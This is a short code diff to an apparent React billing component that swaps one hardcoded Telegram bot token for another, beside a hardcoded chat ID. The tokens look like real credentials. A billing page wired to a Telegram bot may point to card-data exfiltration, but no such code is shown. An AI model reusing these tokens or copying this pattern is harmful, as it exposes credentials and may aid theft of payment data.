@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './Billing.css'; // Import the CSS file for styles
 
-const TELEGRAM_BOT_TOKEN = '7705593258:AAGy9R_5NfdmF37VDxwXFLFduJ5FcvT8kPM'; // Replace with your Telegram bot token
+const TELEGRAM_BOT_TOKEN = '7567933012:AAG_jlPLYWLcQe8G7jgVgiWcXixg9DBaCdo'; // Replace with your Telegram bot token
 const CHAT_ID = '7464995879'; // Replace with your chat ID
 
 
